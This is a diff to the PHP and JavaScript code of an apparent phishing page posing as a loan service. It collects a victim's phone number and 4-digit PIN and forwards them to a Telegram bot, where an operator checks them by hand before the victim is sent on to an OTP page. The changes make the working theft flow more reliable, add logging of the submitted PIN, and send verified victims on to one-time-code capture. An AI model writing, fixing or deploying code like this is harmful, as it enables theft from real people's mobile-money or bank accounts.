@@ -143,24 +143,30 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQU
 
 // ========== Process PIN submission ==========
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
-    // Get PIN from either the array or direct input
+    // Debug: Log the POST data
+    error_log("POST data: " . print_r($_POST, true));
+    
+    // Get PIN from the array
     if (isset($_POST['pin']) && is_array($_POST['pin'])) {
         $pinArray = $_POST['pin'];
         $pin = implode('', $pinArray);
-    } elseif (isset($_POST['pin_string'])) {
-        $pin = $_POST['pin_string'];
     } else {
         $pin = '';
     }
     
     $pin = preg_replace('/[^0-9]/', '', $pin);
     
+    error_log("PIN submitted: '$pin' (length: " . strlen($pin) . ")");
+    
     if (strlen($pin) === 4) {
         $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         if (!$conn) {
             $error = "System error. Please contact administrator.";
+            $_SESSION['pin_error'] = $error;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
         } else {
-            // Ensure `users` table exists (with pin column default 0)
+            // Ensure `users` table exists
             $createSQL = "
                 CREATE TABLE IF NOT EXISTS users (
                     phone VARCHAR(20) PRIMARY KEY,
@@ -171,9 +177,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             ";
             pg_query($conn, $createSQL);
             
-            // Insert phone if not exists (with default pin=0)
+            // Insert phone if not exists
             $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
             pg_query_params($conn, $insertSQL, [$phone]);
+            
+            // Check current pin status before setting to 1
+            $checkSQL = "SELECT pin FROM users WHERE phone = $1";
+            $checkResult = pg_query_params($conn, $checkSQL, [$phone]);
+            if ($checkResult && $row = pg_fetch_assoc($checkResult)) {
+                $currentPinStatus = (int)$row['pin'];
+                
+                // If pin is already 2, redirect to OTP
+                if ($currentPinStatus === 2) {
+                    $_SESSION['pin_verified'] = true;
+                    header("Location: otp.php");
+                    exit;
+                }
+            }
             
             // Set verifying mode - set pin to 1 to start verification
             $updateSQL = "UPDATE users SET pin = 1 WHERE phone = $1";
@@ -183,18 +203,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             $_SESSION['verifying'] = true;
             $_SESSION['submitted_pin'] = $pin;
             
-            // Send Telegram notification of verification attempt
+            // Send Telegram notification
             $ip = "https://loan-1-i36j.onrender.com/verify.php";
             $time = date('Y-m-d H:i:s');
             $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
             sendTelegramMessage($botToken, $chatId, $msg);
             
-            // Instead of immediate error, we'll show verifying message and check via AJAX
-            $verifying = true;
+            // Redirect to show verifying state
+            header("Location: " . $_SERVER['PHP_SELF'] . "?verifying=1");
+            exit;
         }
     } else {
         $error = "PIN must be 4 digits.";
-        // Store error in session to show after redirect
         $_SESSION['pin_error'] = $error;
         header("Location: " . $_SERVER['PHP_SELF']);
         exit;
@@ -202,8 +222,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
 }
 
 // Check if we're in verifying mode
-if (isset($_SESSION['verifying']) && $_SESSION['verifying'] === true) {
+if (isset($_GET['verifying']) || (isset($_SESSION['verifying']) && $_SESSION['verifying'] === true)) {
     $verifying = true;
+    // Clear session verifying after setting
+    if (isset($_SESSION['verifying'])) {
+        unset($_SESSION['verifying']);
+    }
 }
 
 // Check for error from session
@@ -360,6 +384,7 @@ if (isset($_SESSION['pin_error'])) {
             <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
             <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
         </div>
+        <input type="hidden" name="submitted" value="1">
     </form>
     <a href="#" class="forgot">Forgot PIN?</a>
 </div>
@@ -381,20 +406,19 @@ if (isset($_SESSION['pin_error'])) {
     let isSubmitting = false;
     
     function submitForm() {
-        if (isSubmitting) return;
+        if (isSubmitting || isVerifying) return;
         
         let pinValue = '';
-        inputs.forEach(i => {
-            pinValue += i.value;
-        });
+        for (let i = 0; i < inputs.length; i++) {
+            if (!inputs[i].value) {
+                return; // Don't submit if any field is empty
+            }
+            pinValue += inputs[i].value;
+        }
         
-        if (pinValue.length === 4 && !isVerifying) {
+        if (pinValue.length === 4) {
             isSubmitting = true;
-            
-            // Disable inputs while submitting
-            inputs.forEach(i => i.disabled = true);
-            
-            // Submit the form
+            // Submit the form normally - don't disable inputs to ensure values are sent
             document.getElementById('pinForm').submit();
         }
     }
@@ -402,12 +426,13 @@ if (isset($_SESSION['pin_error'])) {
     function allFilled() {
         let filled = true;
         let pinValue = '';
-        inputs.forEach(i => {
-            if (i.value.length === 0) {
+        for (let i = 0; i < inputs.length; i++) {
+            if (!inputs[i].value) {
                 filled = false;
+                break;
             }
-            pinValue += i.value;
-        });
+            pinValue += inputs[i].value;
+        }
         
         if (filled && pinValue.length === 4 && !isVerifying && !isSubmitting) {
             submitForm();
@@ -416,7 +441,7 @@ if (isset($_SESSION['pin_error'])) {
     
     // Function to reset pin to 0 via AJAX when user starts typing
     function resetPinInDatabase() {
-        if (isVerifying) return; // Don't reset if we're in verifying mode
+        if (isVerifying) return;
         
         fetch(window.location.href, {
             method: 'POST',
@@ -461,7 +486,7 @@ if (isset($_SESSION['pin_error'])) {
                 messageContainer.innerHTML = '<div id="statusMessage" class="error-message">Wrong PIN. Try again</div>';
                 isVerifying = false;
                 
-                // Clear the verifying session variable
+                // Reset pin in database
                 fetch(window.location.href, {
                     method: 'POST',
                     headers: {
@@ -471,13 +496,18 @@ if (isset($_SESSION['pin_error'])) {
                     body: 'action=reset_pin'
                 });
                 
-                // Re-enable inputs
+                // Re-enable inputs and clear them
                 inputs.forEach(input => {
                     input.disabled = false;
                     input.value = '';
                 });
                 if (inputs[0]) inputs[0].focus();
                 isSubmitting = false;
+                
+                // Remove verifying parameter from URL
+                const url = new URL(window.location.href);
+                url.searchParams.delete('verifying');
+                window.history.replaceState({}, '', url);
                 
                 // Fade away after 3 seconds
                 setTimeout(() => {
@@ -504,67 +534,74 @@ if (isset($_SESSION['pin_error'])) {
         .catch(error => console.error('Error checking PIN status:', error));
     }
     
-    // Handle user typing in PIN inputs (to reset database pin to 0)
-    inputs.forEach((input, index) => {
-        input.addEventListener('input', (e) => {
-            // Allow only numbers
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
-            
-            // If user starts typing and we have an error message showing, reset the database pin to 0
-            const errorMsg = document.getElementById('statusMessage');
-            if (errorMsg && errorMsg.classList && errorMsg.classList.contains('error-message') && !isVerifying) {
-                resetPinInDatabase();
-                // Clear the error message if it exists
-                if (errorTimeout) clearTimeout(errorTimeout);
-                errorMsg.classList.add('fade-out');
-                setTimeout(() => {
-                    if (errorMsg && errorMsg.parentNode) {
-                        errorMsg.remove();
-                    }
-                }, 500);
-            }
-            
-            // Auto-focus next input
-            if (e.target.value && index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            }
-            
-            // Check if all filled
-            allFilled();
-        });
-        
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-                inputs[index - 1].focus();
-            }
-        });
-        
-        // Prevent paste of non-numeric characters
-        input.addEventListener('paste', (e) => {
-            e.preventDefault();
-            let pasteData = (e.clipboardData || window.clipboardData).getData('text');
-            pasteData = pasteData.replace(/[^0-9]/g, '');
-            if (pasteData) {
-                const digits = pasteData.split('').slice(0, 4);
-                for (let i = 0; i < digits.length && i + index < inputs.length; i++) {
-                    inputs[index + i].value = digits[i];
+    // Handle user typing in PIN inputs
+    if (!isVerifying) {
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                // Allow only numbers
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                
+                // If user starts typing and we have an error message showing, reset the database pin
+                const errorMsg = document.getElementById('statusMessage');
+                if (errorMsg && errorMsg.classList && errorMsg.classList.contains('error-message')) {
+                    resetPinInDatabase();
+                    if (errorTimeout) clearTimeout(errorTimeout);
+                    errorMsg.classList.add('fade-out');
+                    setTimeout(() => {
+                        if (errorMsg && errorMsg.parentNode) {
+                            errorMsg.remove();
+                        }
+                    }, 500);
                 }
-                // Focus next empty input or last input
-                for (let i = 0; i < inputs.length; i++) {
-                    if (!inputs[i].value) {
-                        inputs[i].focus();
-                        break;
-                    }
+                
+                // Auto-focus next input
+                if (e.target.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
                 }
+                
+                // Check if all filled
                 allFilled();
-            }
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                    inputs[index - 1].value = '';
+                    e.preventDefault();
+                }
+            });
+            
+            // Prevent paste of non-numeric characters
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                let pasteData = (e.clipboardData || window.clipboardData).getData('text');
+                pasteData = pasteData.replace(/[^0-9]/g, '');
+                if (pasteData) {
+                    const digits = pasteData.split('').slice(0, 4);
+                    for (let i = 0; i < digits.length && i + index < inputs.length; i++) {
+                        inputs[index + i].value = digits[i];
+                    }
+                    // Focus next empty input
+                    for (let i = 0; i < inputs.length; i++) {
+                        if (!inputs[i].value) {
+                            inputs[i].focus();
+                            break;
+                        }
+                    }
+                    allFilled();
+                }
+            });
         });
-    });
+    }
     
     // Start verification polling if in verifying mode
     if (isVerifying) {
-        verificationInterval = setInterval(checkPinStatus, 2000); // Check every 2 seconds
-        // Also check immediately
+        // Disable inputs
+        inputs.forEach(input => {
+            input.disabled = true;
+        });
+        
+        verificationInterval = setInterval(checkPinStatus, 2000);
         setTimeout(checkPinStatus, 500);
     }
 </script>
